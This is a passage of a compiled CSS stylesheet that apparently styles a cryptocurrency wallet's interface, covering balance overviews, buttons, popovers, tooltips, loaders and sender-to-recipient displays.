      margin-left: 4px; }
      .eth-overview__cached-balance, .eth-overview__cached-star {
      color: #f2a202; }
      .eth-overview__cached-secondary-balance {
      color: rgba(220, 153, 18, 0.690196);
      font-size: 16px;
      line-height: 23px; }
      .eth-overview__secondary-balance {
      font-size: 16px;
      line-height: 23px;
      font-weight: 400;
      color: #848c96; }
      .eth-overview__button {
      margin-right: 24px; }
      .eth-overview__button:last-of-type {
      margin-right: 0; }
      .eth-overview__circle {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 36px;
      width: 36px;
      background: #037dd6;
      border-radius: 18px;
      margin-top: 6px; }
      .token-overview__balance {
      display: flex;
      flex-direction: column;
      min-width: 0;
      position: relative;
      align-items: center;
      margin: 16px 0;
      padding: 0 16px;
      max-width: 100%; }
      .token-overview__primary-balance {
      color: #000;
      font-size: 32px;
      line-height: 45px;
      width: 100%;
      justify-content: center; }
      .token-overview__secondary-balance {
      font-size: 16px;
      line-height: 23px;
      font-weight: 400;
      color: #848c96; }
      .token-overview__button {
      margin-right: 24px; }
      .token-overview__button:last-of-type {
      margin-right: 0; }
      /** Please import your files in alphabetical order **/
      .account-mismatch-warning__tooltip-container-icon {
      display: flex;
      align-items: center; }
      .alert-circle-icon--danger {
      border-color: #d73a49;
      color: #d73a49;
      background: #fcf2f3; }
      .alert-circle-icon--warning {
      border-color: #ffd33d;
      color: #ffd33d;
      background: #fefae8; }
      .global-alert {
      position: relative;
      width: 100%;
      background-color: #33a4e7; }
      .global-alert .msg {
      width: 100%;
      display: block;
      color: white;
      font-size: 12px;
      text-align: center; }
      .global-alert.hidden {
      -webkit-animation: alertHidden 0.5s ease forwards;
      animation: alertHidden 0.5s ease forwards; }
      .global-alert.visible {
      -webkit-animation: alert 0.5s ease forwards;
      animation: alert 0.5s ease forwards; }
      /* Animation */
      @-webkit-keyframes alert {
      0% {
      opacity: 0;
      top: -50px;
      padding: 0;
      line-height: 12px; }
      50% {
      opacity: 1; }
      100% {
      top: 0;
      padding: 8px;
      line-height: 12px; } }
      @keyframes alert {
      0% {
      opacity: 0;
      top: -50px;
      padding: 0;
      line-height: 12px; }
      50% {
      opacity: 1; }
      100% {
      top: 0;
      padding: 8px;
      line-height: 12px; } }
      @-webkit-keyframes alertHidden {
      0% {
      top: 0;
      opacity: 1;
      padding: 8px;
      line-height: 12px; }
      100% {
      opacity: 0;
      top: -50px;
      padding: 0;
      line-height: 0; } }
      @keyframes alertHidden {
      0% {
      top: 0;
      opacity: 1;
      padding: 8px;
      line-height: 12px; }
      100% {
      opacity: 0;
      top: -50px;
      padding: 0;
      line-height: 0; } }
      .breadcrumbs {
      display: flex;
      flex-flow: row nowrap; }
      .breadcrumb {
      height: 10px;
      width: 10px;
      border: 1px solid #979797;
      border-radius: 50%; }
      .breadcrumb + .breadcrumb {
      margin-left: 10px; }
      .button-group {
      display: flex;
      justify-content: center;
      align-items: center; }
      .button-group__button {
      font-size: 1rem;
      color: #4d4d4d;
      border-style: solid;
      border-color: #dedede;
      border-width: 1px 1px 1px;
      border-left: 0;
      flex: 1;
      padding: 12px;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis; }
      .button-group__button:first-child {
      border-left: 1px solid #dedede;
      border-radius: 4px 0 0 4px; }
      .button-group__button:last-child {
      border-radius: 0 4px 4px 0; }
      .button-group__button--active {
      background-color: #3099f2;
      color: #fff; }
      .button-group__button:disabled {
      opacity: 0.5; }
      .radio-button-group .radio-button {
      font-style: normal;
      font-weight: normal;
      font-size: 0.75rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      color: #3b4046;
      border: 1px solid #d6d9dc;
      background: #fff;
      border-radius: 25px;
      height: 25px;
      margin-right: 8px;
      min-width: 48px;
      padding: 0; }
      .radio-button-group .radio-button--active {
      background: #037dd6;
      color: white;
      border: none; }
      .radio-button-group .radio-button--danger {
      border: 1px solid #d73a49;
      color: #d73a49;
      background: #fff; }
      .radio-button-group .radio-button:hover {
      box-shadow: 0 0 14px rgba(0, 0, 0, 0.18); }
      .radio-button-group .radio-button--active.radio-button--danger {
      border: 1px solid #d73a49;
      color: white;
      background: #d73a49; }
      /*
      Buttons
      */
      .button {
      font-style: normal;
      font-weight: normal;
      font-size: 0.875rem;
      line-height: 140%;
      font-weight: 500;
      line-height: 1.25rem;
      padding: 0.75rem 1rem;
      display: flex;
      justify-content: center;
      align-items: center;
      box-sizing: border-box;
      border-radius: 6px;
      width: 100%;
      transition: border-color 0.3s ease, background-color 0.3s ease; }
      .button--disabled, .button[disabled] {
      cursor: auto;
      opacity: 0.5;
      pointer-events: none; }
      .button__icon {
      display: flex;
      align-items: center;
      margin-right: 4px; }
      .btn-secondary {
      color: #037dd6;
      border: 2px solid #b0d7f2;
      background-color: #fff; }
      .btn-secondary:hover {
      border-color: #037dd6; }
      .btn-secondary:active {
      background: #eaf6ff;
      border-color: #037dd6; }
      .btn-secondary--disabled, .btn-secondary[disabled] {
      opacity: 1;
      color: #b0d7f2; }
      .btn-warning {
      color: #f66a0a;
      border: 2px solid #ffd3b5;
      background-color: #fff; }
      .btn-warning:hover {
      border-color: #f66a0a; }
      .btn-warning:active {
      background: #fef5ef;
      border-color: #f66a0a; }
      .btn-warning--disabled, .btn-warning[disabled] {
      opacity: 1;
      color: #ffd3b5; }
      .btn-danger {
      color: #d73a49;
      border: 2px solid #feb6bf;
      background-color: #fff; }
      .btn-danger:hover {
      border-color: #d73a49; }
      .btn-danger:active {
      background: #fcf2f3;
      border-color: #d73a49; }
      .btn-danger--disabled, .btn-danger[disabled] {
      opacity: 1;
      color: #feb6bf; }
      .btn-danger-primary {
      color: #fff;
      border: 2px solid #d73a49;
      background-color: #d73a49; }
      .btn-danger-primary:hover {
      border-color: #c72837;
      background-color: #c72837; }
      .btn-danger-primary:active {
      background: #b92534;
      border-color: #b92534; }
      .btn-danger-primary--disabled, .btn-danger-primary[disabled] {
      opacity: 1;
      border-color: #feb6bf;
      background-color: #feb6bf; }
      .btn-default {
      color: #6a737d;
      border: 2px solid #b3b3b3; }
      .btn-default:hover {
      border-color: #6a737d; }
      .btn-default:active {
      background: #fbfbfc;
      border-color: #6a737d; }
      .btn-default--disabled, .btn-default[disabled] {
      opacity: 1;
      color: #b3b3b3; }
      .btn-primary {
      color: #fff;
      border: 2px solid #037dd6;
      background-color: #037dd6; }
      .btn-primary:hover {
      border-color: #0372c3;
      background-color: #0372c3; }
      .btn-primary:active {
      background: #0260a4;
      border-color: #0260a4; }
      .btn-primary--disabled, .btn-primary[disabled] {
      border-color: #b0d7f2;
      background-color: #b0d7f2; }
      .btn-link {
      font-style: normal;
      font-weight: normal;
      font-size: 1.125rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      color: #037dd6;
      line-height: 1.25rem;
      cursor: pointer;
      background-color: transparent; }
      .btn-link:hover {
      color: #1098fc; }
      .btn-link:active {
      color: #0260a4; }
      .btn-link--disabled, .btn-link[disabled] {
      cursor: auto;
      opacity: 1;
      pointer-events: none;
      color: #b0d7f2; }
      .btn--large {
      min-height: 54px; }
      /**
      All Buttons styles are deviations from design guide
      */
      .btn-raised {
      color: #037dd6;
      background-color: #fff;
      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.08);
      padding: 6px;
      height: initial;
      min-height: initial;
      width: initial;
      min-width: initial; }
      .btn--first-time {
      height: 54px;
      width: 198px;
      box-shadow: 0 2px 4px 0 rgba(0, 0, 0, 0.14);
      color: #fff;
      font-size: 1.25rem;
      font-weight: 500;
      transition: 200ms ease-in-out;
      background-color: #3375bb;
      border-radius: 0; }
      button[disabled],
      input[type="submit"][disabled] {
      cursor: not-allowed;
      opacity: 0.5; }
      button.primary {
      padding: 8px 12px;
      background: #f7861c;
      box-shadow: 0 3px 6px rgba(247, 134, 28, 0.36);
      color: #fff;
      font-size: 1.1em;
      text-transform: uppercase; }
      .btn--rounded {
      border-radius: 100px;
      will-change: box-shadow;
      transition: box-shadow cubic-bezier(0.6, -0.28, 0.735, 0.045) 200ms; }
      .btn--rounded:hover {
      box-shadow: 0 0 8px rgba(0, 0, 0, 0.1); }
      .btn--rounded.btn-secondary {
      border: 1px solid #037dd6; }
      .btn--rounded.btn-secondary--disabled, .btn--rounded.btn-secondary[disabled] {
      border-color: #b0d7f2;
      color: #b0d7f2; }
      .btn--rounded.btn-secondary:active {
      border-color: #0260a4; }
      .btn--rounded.btn-default {
      border: 1px solid #6a737d; }
      .btn--rounded.btn-default--disabled, .btn--rounded.btn-default[disabled] {
      border-color: #d6d9dc;
      color: #b3b3b3; }
      .btn--rounded.btn-default:active {
      border-color: #535a61; }
      .btn--rounded.btn-danger {
      border: 1px solid #d73a49; }
      .btn--rounded.btn-danger--disabled, .btn--rounded.btn-danger[disabled] {
      border-color: #f7d5d8;
      color: #e88f97; }
      .btn--rounded.btn-danger:active {
      border-color: #b92534; }
      .btn--rounded.btn-warning {
      border: 1px solid #f66a0a; }
      .btn--rounded.btn-warning--disabled, .btn--rounded.btn-warning[disabled] {
      border-color: #f8b588;
      color: #f8b588; }
      .btn--rounded.btn-warning:active {
      border-color: #c65507; }
      .btn--rounded.btn-primary {
      background-color: #037dd6; }
      .btn--rounded.btn-primary--disabled, .btn--rounded.btn-primary[disabled] {
      background-color: #b0d7f2; }
      .btn--rounded.btn-primary:active {
      background-color: #0260a4; }
      .btn--rounded.btn-danger-primary {
      background-color: #d73a49; }
      .btn--rounded.btn-danger-primary--disabled, .btn--rounded.btn-danger-primary[disabled] {
      background-color: #e88f97; }
      .btn--rounded.btn-danger-primary:active {
      background-color: #b92534; }
      .card {
      border-radius: 4px;
      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.08);
      padding: 8px; }
      .card__title {
      border-bottom: 1px solid #d8d8d8;
      padding-bottom: 4px;
      text-transform: capitalize; }
      .check-box {
      -webkit-appearance: none;
      -moz-appearance: none;
      appearance: none;
      background: #fff;
      color: #d6d9dc;
      width: 18px;
      height: 18px;
      font-size: 21px;
      line-height: 0.9;
      border-radius: 2px;
      display: flex; }
      .check-box__checked, .check-box__indeterminate {
      color: #037dd6;
      border-color: #037dd6; }
      .check-box:disabled {
      color: #d6d9dc;
      cursor: not-allowed; }
      .circle-icon__container {
      position: relative;
      display: flex;
      justify-content: center;
      align-items: center; }
      .circle-icon__border {
      border-radius: 50%;
      position: absolute; }
      .circle-icon__circle {
      border: 1px solid;
      border-color: #000;
      background: #fff; }
      .circle-icon__icon {
      position: relative; }
      .currency-display-component {
      display: flex;
      align-items: center; }
      .currency-display-component__text {
      /*rtl:ignore*/
      direction: ltr;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis; }
      .currency-display-component__suffix {
      padding-left: 4px; }
      .currency-input__conversion-component {
      font-size: 12px;
      line-height: 12px;
      padding-left: 1px; }
      .currency-input__swap-component {
      flex: 0 0 auto;
      height: 24px;
      width: 24px;
      background-image: url("images/icons/swap.svg");
      background-size: contain;
      background-repeat: no-repeat;
      cursor: pointer;
      opacity: 0.4; }
      .currency-input__swap-component:hover {
      opacity: 0.3; }
      .currency-input__swap-component:active {
      opacity: 0.5; }
      .dialog {
      font-size: 0.75rem;
      line-height: 1rem;
      padding: 1rem;
      border: 1px solid #000;
      box-sizing: border-box;
      border-radius: 8px; }
      .dialog--message {
      border-color: #75c4fd;
      color: #0260a4;
      background-color: #eaf6ff; }
      .dialog--error {
      border-color: #e88f97;
      color: #b92534;
      background-color: #fcf2f3; }
      .dialog--warning {
      border-color: #faa66c;
      color: #c65507;
      background-color: #fef5ef; }
      .dropdown {
      appearance: none;
      -moz-appearance: none;
      -webkit-appearance: none;
      border: 1px solid #6a737d;
      border-radius: 6px;
      background-image: url("/images/icons/caret-down.svg");
      background-repeat: no-repeat, repeat;
      background-position: right 18px top 50%;
      background-color: white;
      padding: 8px 32px 8px 16px;
      font-size: 14px; }
      [dir='rtl'] .dropdown {
      background-position: left 18px top 50%;
      padding: 8px 16px 8px 32px; }
      .editable-label {
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative; }
      .editable-label__value {
      max-width: 250px;
      overflow: hidden;
      white-space: nowrap;
      text-overflow: ellipsis; }
      .editable-label__input {
      width: 250px;
      font-size: 14px;
      text-align: center;
      border: 1px solid #dedede; }
      .editable-label__input--error {
      border: 1px solid #d0021b; }
      .editable-label__icon-wrapper {
      position: absolute;
      margin-left: 10px;
      left: 100%; }
      .editable-label__icon {
      cursor: pointer;
      color: #9b9b9b; }
      .error-message {
      min-height: 32px;
      border: 1px solid #d0021b;
      color: #d0021b;
      background: #fff1f2;
      border-radius: 4px;
      font-size: 0.75rem;
      display: flex;
      justify-content: flex-start;
      align-items: center;
      padding: 8px 16px; }
      .error-message__icon {
      margin-right: 8px;
      flex: 0 0 auto; }
      .error-message__text {
      overflow: auto; }
      .export-text-container {
      display: flex;
      justify-content: center;
      flex-direction: column;
      align-items: center;
      border: 1px solid #dedede;
      border-radius: 4px;
      font-weight: 400; }
      .export-text-container__text-container {
      width: 100%;
      display: flex;
      justify-content: center;
      padding: 20px;
      border-radius: 4px;
      background: #fafafa; }
      .export-text-container__text {
      resize: none;
      border: none;
      background: #fafafa;
      font-size: 20px;
      text-align: center; }
      .export-text-container__buttons-container {
      display: flex;
      flex-direction: row;
      border-top: 1px solid #dedede;
      width: 100%; }
      .export-text-container__button {
      padding: 10px;
      flex: 1;
      display: flex;
      justify-content: center;
      align-items: center;
      font-size: 12px;
      cursor: pointer;
      color: #037dd6; }
      .export-text-container__button--copy {
      border-right: 1px solid #dedede; }
      .export-text-container__button-text {
      padding-left: 10px; }
      .icon-border {
      border-radius: 50%;
      border: 1px solid #f2f3f4;
      background: #fff;
      display: flex;
      justify-content: center;
      align-items: center; }
      .icon-button {
      display: flex;
      flex-direction: column;
      align-items: center;
      background-color: unset;
      text-align: center;
      font-style: normal;
      font-weight: normal;
      font-size: 0.75rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      font-size: 13px;
      cursor: pointer;
      color: #037dd6; }
      .icon-button__circle {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 36px;
      width: 36px;
      background: #037dd6;
      border-radius: 18px;
      margin-top: 6px;
      margin-bottom: 5px; }
      .icon-button--disabled {
      opacity: 0.3;
      cursor: auto; }
      .icon-with-fallback__fallback {
      color: black; }
      .icon-with-label {
      display: flex;
      align-items: center; }
      .icon-with-label__label {
      font-size: 10px;
      margin-left: 4px;
      color: #6a737d; }
      .info-icon {
      margin: 0 4px; }
      .info-icon--success {
      fill: #28a745; }
      .info-icon--info {
      fill: #037dd6; }
      .info-icon--warning {
      fill: #ffd33d; }
      .info-icon--danger {
      fill: #d73a49; }
      .preloader__icon {
      -webkit-animation-name: spin;
      animation-name: spin;
      -webkit-animation-duration: 500ms;
      animation-duration: 500ms;
      -webkit-animation-iteration-count: infinite;
      animation-iteration-count: infinite;
      -webkit-animation-timing-function: linear;
      animation-timing-function: linear; }
      @keyframes spin {
      from {
      -webkit-transform: rotate(0deg);
      transform: rotate(0deg); }
      to {
      -webkit-transform: rotate(360deg);
      transform: rotate(360deg); } }
      .identicon {
      /*rtl:ignore*/
      direction: ltr;
      display: flex;
      flex-shrink: 0;
      align-items: center;
      justify-content: center;
      overflow: hidden; }
      .identicon__address-wrapper {
      height: 40px;
      width: 40px;
      border-radius: 18px;
      display: flex;
      justify-content: center;
      align-items: center;
      border-style: solid;
      border-radius: 50%;
      border-width: 2px;
      border-color: #037dd6; }
      .identicon__eth-logo {
      border: 1px solid #dedede;
      background: #fff; }
      .info-tooltip img {
      height: 12px;
      width: 12px; }
      .tippy-popper[x-placement^=top] .tippy-tooltip-info-theme [x-arrow],
      .tippy-popper[x-placement^=top] .tippy-tooltip-wideInfo-theme [x-arrow] {
      border-top-color: #fff; }
      .tippy-popper[x-placement^=right] .tippy-tooltip-info-theme [x-arrow],
      .tippy-popper[x-placement^=right] .tippy-tooltip-wideInfo-theme [x-arrow] {
      border-right-color: #fff; }
      .tippy-popper[x-placement^=left] .tippy-tooltip-info-theme [x-arrow],
      .tippy-popper[x-placement^=left] .tippy-tooltip-wideInfo-theme [x-arrow] {
      border-left-color: #fff; }
      .tippy-popper[x-placement^=bottom] .tippy-tooltip-info-theme [x-arrow],
      .tippy-popper[x-placement^=bottom] .tippy-tooltip-wideInfo-theme [x-arrow] {
      border-bottom-color: #fff; }
      .tippy-tooltip.tippy-tooltip-info-theme, .tippy-tooltip.tippy-tooltip-wideInfo-theme {
      background: white;
      color: black;
      box-shadow: 0 0 14px rgba(0, 0, 0, 0.18);
      border-radius: 8px;
      max-width: 203px;
      padding: 16px;
      padding-bottom: 15px; }
      .tippy-tooltip.tippy-tooltip-info-theme .tippy-tooltip-content, .tippy-tooltip.tippy-tooltip-wideInfo-theme .tippy-tooltip-content {
      font-style: normal;
      font-weight: normal;
      font-size: 0.75rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      text-align: left;
      color: #6a737d; }
      .tippy-tooltip.tippy-tooltip-wideInfo-theme {
      max-width: 260px; }
      .list-item {
      width: 100%;
      min-height: 86px;
      margin: 0;
      background: #fff;
      padding: 24px 16px;
      font-style: normal;
      font-weight: normal;
      font-size: 1rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      border-top: 1px solid #e5e5e5;
      border-bottom: 1px solid #e5e5e5;
      color: #24292e;
      display: grid;
      grid-template-columns: 0fr repeat(11, 1fr);
      grid-template-areas: 'icon head     head     head     head     head     head     head     right right right right' 'icon sub      sub      sub      sub      sub      sub      sub      right right right right' '.    actions  actions  actions  actions  actions  actions  actions  right right right right';
      align-items: start;
      cursor: pointer; }
      .list-item:hover {
      background-color: #f2f3f4; }
      .list-item__icon {
      grid-area: icon;
      align-self: center; }
      .list-item__icon > * {
      margin: 0 16px 0 0; }
      .list-item__actions {
      grid-area: actions; }
      .list-item__heading {
      grid-area: head;
      font-size: 16px;
      line-height: 160%;
      position: relative;
      display: flex;
      align-items: center; }
      .list-item__heading-wrap {
      display: inline-block;
      margin-left: 8px; }
      .list-item__title {
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap; }
      .list-item__subheading {
      grid-area: sub;
      font-size: 12px;
      line-height: 14px;
      color: #6a737d;
      margin-top: 4px; }
      .list-item__subheading > * {
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap; }
      .list-item__subheading:empty {
      display: none; }
      .list-item__mid-content {
      grid-area: mid;
      font-size: 12px;
      color: #6a737d; }
      .list-item__right-content {
      grid-area: right;
      text-align: right;
      align-items: flex-end;
      overflow: hidden;
      white-space: nowrap; }
      @media (max-width: 575px) {
      .list-item__mid-content {
      display: none; } }
      @media (min-width: 576px) {
      .list-item {
      grid-template-areas: 'icon head     head     head     head     mid mid mid mid right right right' 'icon sub      sub      sub      sub      mid mid mid mid right right right' '.    actions  actions  actions  actions  mid mid mid mid right right right'; } }
      .loading-overlay {
      left: 0;
      z-index: 51;
      position: fixed;
      flex-direction: column;
      display: flex;
      justify-content: center;
      align-items: center;
      flex: 1 1 auto;
      width: 100%;
      height: 100%;
      background: rgba(255, 255, 255, 0.8); }
      .loading-overlay__screen-content {
      display: flex;
      flex-direction: column;
      align-items: center; }
      .loading-overlay__container {
      position: absolute;
      top: 33%;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center; }
      .loading-overlay__message {
      margin-top: 32px;
      font-weight: 400;
      font-size: 20px;
      color: #93949d; }
      .loading-overlay__error-screen {
      display: flex;
      flex-direction: column;
      align-items: center;
      height: 160px;
      justify-content: space-evenly; }
      .loading-overlay__error-buttons {
      display: flex;
      flex-direction: row; }
      .loading-overlay__error-buttons button {
      margin: 5px; }
      .loading-overlay__emoji {
      font-size: 32px; }
      .loading-overlay__spinner {
      height: 58px;
      width: 58px; }
      .menu__container {
      background: #fff;
      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.214);
      border-radius: 8px;
      width: 225px;
      color: #24292e;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 0 16px;
      font-size: 14px;
      font-weight: normal;
      line-height: 20px;
      z-index: 1050; }
      .menu__background {
      position: absolute;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      z-index: 1050; }
      .menu-item {
      background: none;
      font-size: inherit;
      display: grid;
      grid-template-columns: -webkit-min-content auto;
      grid-template-columns: min-content auto;
      text-align: start;
      align-items: center;
      width: 100%;
      padding: 14px 0;
      cursor: pointer; }
      .menu-item__icon {
      margin-right: 8px;
      grid-row: 1 / span 2;
      color: #6a737d; }
      .menu-item .disconnect-icon::before {
      content: "";
      background-image: url(/images/icons/disconnect.svg);
      background-size: contain;
      background-repeat: no-repeat;
      background-position: center;
      padding: 8px;
      display: flex; }
      .page-container {
      width: 408px;
      background-color: #fff;
      box-shadow: 0 0 7px 0 rgba(0, 0, 0, 0.08);
      z-index: 25;
      display: flex;
      flex-flow: column;
      border-radius: 8px;
      overflow-y: auto; }
      .page-container__header {
      display: flex;
      flex-flow: column;
      border-bottom: 1px solid #d2d8dd;
      padding: 16px;
      flex: 0 0 auto;
      position: relative; }
      .page-container__header--no-padding-bottom {
      padding-bottom: 0; }
      .page-container__header-close {
      color: #4d4d4d;
      position: absolute;
      top: 16px;
      right: 16px;
      cursor: pointer;
      overflow: hidden; }
      .page-container__header-close::after {
      content: '\00D7';
      font-size: 40px;
      line-height: 20px; }
      .page-container__header-row {
      padding-bottom: 10px;
      display: flex;
      justify-content: space-between; }
      .page-container__bottom {
      flex: 1;
      display: flex;
      flex-direction: column;
      min-height: 0; }
      .page-container__footer {
      display: flex;
      flex-flow: column;
      justify-content: center;
      border-top: 1px solid #d2d8dd;
      flex: 0 0 auto; }
      .page-container__footer footer {
      display: flex;
      flex-flow: row;
      justify-content: center;
      padding: 16px;
      flex: 0 0 auto; }
      .page-container__footer-secondary {
      display: flex;
      flex-flow: row;
      justify-content: space-around;
      padding: 0 16px 16px;
      flex: 0 0 auto; }
      .page-container__footer-secondary a,
      .page-container__footer-secondary a:hover {
      text-decoration: none;
      cursor: pointer;
      font-size: 0.75rem;
      text-transform: uppercase;
      color: #2f9ae0; }
      .page-container__footer-button {
      margin-right: 16px; }
      .page-container__footer-button:last-of-type {
      margin-right: 0; }
      .page-container__back-button {
      color: #2f9ae0;
      font-size: 1rem;
      cursor: pointer;
      font-weight: 400; }
      .page-container__title {
      color: #000;
      font-size: 2rem;
      font-weight: 500;
      line-height: 2rem;
      margin-right: 1.5rem; }
      .page-container__subtitle {
      padding-top: 0.5rem;
      line-height: initial;
      font-size: 0.9rem;
      color: #808080; }
      .page-container__tabs {
      display: flex;
      margin-top: 16px; }
      .page-container__tab {
      min-width: 5rem;
      color: #9b9b9b;
      font-size: 1rem;
      border-bottom: none;
      margin-right: 16px; }
      .page-container__tab:last-of-type {
      margin-right: 0; }
      .page-container--full-width {
      width: 100% !important; }
      .page-container--full-height {
      height: 100% !important;
      max-height: initial !important;
      min-height: initial !important; }
      .page-container__content {
      overflow-y: auto;
      flex: 1; }
      .page-container__warning-container {
      background: #fdf4f4;
      padding: 20px;
      display: flex;
      align-items: start; }
      .page-container__warning-message {
      padding-left: 15px; }
      .page-container__warning-title {
      font-weight: 500; }
      .page-container__warning-icon {
      padding-top: 5px; }
      @media screen and (max-width: 250px) {
      .page-container__footer {
      flex-flow: column-reverse; }
      .page-container__footer-button {
      width: 100%;
      margin-bottom: 1rem;
      margin-right: 0; }
      .page-container__footer-button:first-of-type {
      margin-bottom: 0; } }
      @media screen and (max-width: 575px) {
      .page-container {
      height: 100%;
      width: 100%;
      background-color: #fff;
      border-radius: 0;
      flex: 1;
      overflow-y: auto; } }
      @media screen and (min-width: 576px) {
      .page-container {
      max-height: 82vh;
      min-height: 570px;
      flex: 0 0 auto;
      margin-right: auto;
      margin-left: auto; } }
      .popover-wrap {
      display: flex;
      flex-direction: column;
      position: absolute;
      width: 328px;
      max-height: 94vh;
      box-shadow: 0 4px 30px rgba(0, 0, 0, 0.25);
      border-radius: 10px;
      background: white; }
      .popover-wrap ::-webkit-scrollbar {
      width: 6px; }
      .popover-wrap ::-webkit-scrollbar-thumb {
      border-radius: 10px;
      background: #c4c4c4; }
      .popover-header {
      display: flex;
      padding: 24px 24px 16px;
      flex-direction: column;
      background: white;
      position: relative;
      border-radius: 10px; }
      .popover-header__title {
      display: flex;
      align-items: center;
      justify-content: space-between;
      font-style: normal;
      font-weight: normal;
      font-size: 1.125rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      font-weight: bold;
      line-height: 25px; }
      .popover-header__title h2 {
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis; }
      .popover-header__title h2 button {
      margin-right: 24px; }
      .popover-header__subtitle {
      font-style: normal;
      font-weight: normal;
      font-size: 0.875rem;
      line-height: 140%;
      padding-top: 8px;
      line-height: 20px; }
      .popover-header__button {
      background: none;
      font-size: inherit;
      padding: 0; }
      .popover-header i {
      cursor: pointer; }
      .popover-bg {
      width: 100%;
      height: 100%;
      background: black;
      opacity: 0.2; }
      .popover-content {
      overflow-y: auto;
      position: relative;
      display: flex;
      flex: 1;
      flex-direction: column;
      justify-content: flex-start;
      align-items: stretch;
      align-content: stretch;
      border-radius: 10px; }
      .popover-container {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 1050; }
      .popover-footer {
      display: flex;
      flex-direction: row;
      justify-content: space-between;
      border-top: 1px solid #d2d8dd;
      padding: 16px 24px 24px; }
      .popover-footer > :only-child {
      margin: 0 auto; }
      .popover-arrow {
      width: 22px;
      height: 22px;
      background: white;
      position: absolute;
      -webkit-transform: rotate(45deg);
      transform: rotate(45deg);
      box-shadow: 0 4px 30px rgba(0, 0, 0, 0.25); }
      .pulse-loader {
      display: flex; }
      .pulse-loader__loading-dot-one, .pulse-loader__loading-dot-two, .pulse-loader__loading-dot-three {
      background: #037dd6;
      width: 9px;
      height: 9px;
      margin-right: 2px;
      border-radius: 100%;
      -webkit-animation-fill-mode: both;
      animation-fill-mode: both; }
      .pulse-loader__loading-dot-one {
      -webkit-animation: loading-dot 0.75s 0.12s infinite cubic-bezier(0.2, 0.68, 0.18, 1.08);
      animation: loading-dot 0.75s 0.12s infinite cubic-bezier(0.2, 0.68, 0.18, 1.08); }
      .pulse-loader__loading-dot-two {
      -webkit-animation: loading-dot 0.75s 0.24s infinite cubic-bezier(0.2, 0.68, 0.18, 1.08);
      animation: loading-dot 0.75s 0.24s infinite cubic-bezier(0.2, 0.68, 0.18, 1.08); }
      .pulse-loader__loading-dot-three {
      -webkit-animation: loading-dot 0.75s 0.36s infinite cubic-bezier(0.2, 0.68, 0.18, 1.08);
      animation: loading-dot 0.75s 0.36s infinite cubic-bezier(0.2, 0.68, 0.18, 1.08); }
      @-webkit-keyframes loading-dot {
      0% {
      -webkit-transform: scale(1);
      transform: scale(1);
      opacity: 1; }
      45% {
      -webkit-transform: scale(0.7);
      transform: scale(0.7);
      opacity: 0.7; }
      80% {
      -webkit-transform: scale(1);
      transform: scale(1);
      opacity: 1; } }
      @keyframes loading-dot {
      0% {
      -webkit-transform: scale(1);
      transform: scale(1);
      opacity: 1; }
      45% {
      -webkit-transform: scale(0.7);
      transform: scale(0.7);
      opacity: 0.7; }
      80% {
      -webkit-transform: scale(1);
      transform: scale(1);
      opacity: 1; } }
      .qr-code {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center; }
      .qr-code__message-container > div:first-child {
      margin-top: 18px;
      font-size: 15px;
      color: #4d4d4d; }
      .qr-code__message {
      font-size: 12px;
      color: #f7861c; }
      .qr-code__error {
      display: flex;
      justify-content: center;
      align-items: center;
      color: #f7861c;
      margin-bottom: 9px; }
      .readonly-input__input {
      direction: ltr;
      overflow: hidden;
      text-overflow: ellipsis;
      width: 100%; }
      .sender-to-recipient {
      width: 100%;
      display: flex;
      flex-direction: row;
      justify-content: center;
      position: relative;
      flex: 0 0 auto; }
      .sender-to-recipient--default {
      border-bottom: 1px solid #d2d8dd;
      height: 42px; }
      .sender-to-recipient--default .sender-to-recipient__tooltip-wrapper {
      min-width: 0; }
      .sender-to-recipient--default .sender-to-recipient__tooltip-container {
      max-width: 100%; }
      .sender-to-recipient--default .sender-to-recipient__party {
      display: flex;
      flex-direction: row;
      align-items: center;
      flex: 1;
      padding: 0 16px;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis; }
      .sender-to-recipient--default .sender-to-recipient__party--sender {
      padding-right: 30px;
      cursor: pointer; }
      .sender-to-recipient--default .sender-to-recipient__party--recipient {
      padding-left: 30px;
      border-left: 1px solid #d2d8dd; }
      .sender-to-recipient--default .sender-to-recipient__party--recipient-with-address {
      cursor: pointer; }
      .sender-to-recipient--default .sender-to-recipient__arrow-container {
      position: absolute;
      height: 100%;
      display: flex;
      align-items: center;
      justify-content: center; }
      [dir='rtl'] .sender-to-recipient--default .sender-to-recipient__arrow-container {
      -webkit-transform: rotate(180deg);
      transform: rotate(180deg); }
      .sender-to-recipient--default .sender-to-recipient__arrow-circle {
      background: #fff;
      padding: 5px;
      border: 1px solid #d2d8dd;
      border-radius: 20px;
      height: 32px;
      width: 32px;
      display: flex;
      justify-content: center;
      align-items: center; }
      .sender-to-recipient--default .sender-to-recipient__name {
      padding-left: 14px;
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap;
      font-size: 0.875rem; }
      [dir='rtl'] .sender-to-recipient--default .sender-to-recipient__name {
      /*rtl:ignore*/
      direction: ltr;
      /*rtl:ignore*/
      text-align: right; }
